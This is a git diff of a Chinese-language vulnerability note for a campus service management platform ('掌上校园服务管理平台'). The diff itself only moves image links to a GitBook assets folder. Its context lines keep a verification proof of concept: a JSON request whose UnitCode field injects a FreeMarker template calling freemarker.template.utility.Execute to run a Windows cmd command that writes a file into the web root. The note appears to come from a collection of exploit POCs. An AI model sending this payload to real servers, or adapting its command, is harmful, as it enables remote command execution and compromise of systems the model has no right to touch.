@@ -18,7 +18,7 @@ title="掌上校园服务管理平台"
 
 登陆页面
 
-![image-20230828112934396](images/image-20230828112934396.png)
+![image-20230828112934396](../.gitbook/assets/image-20230828112934396.png)
 
 验证POC
 
@@ -31,6 +31,6 @@ Content-Type: application/json
 {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo Test > ./webapps/ROOT/Test.txt\")}"}
 ```
 
-![image-20230828112953699](images/image-20230828112953699.png)
+![image-20230828112953699](../.gitbook/assets/image-20230828112953699.png)
 
-![image-20230828113009271](images/image-20230828113009271.png)
+![image-20230828113009271](../.gitbook/assets/image-20230828113009271.png)
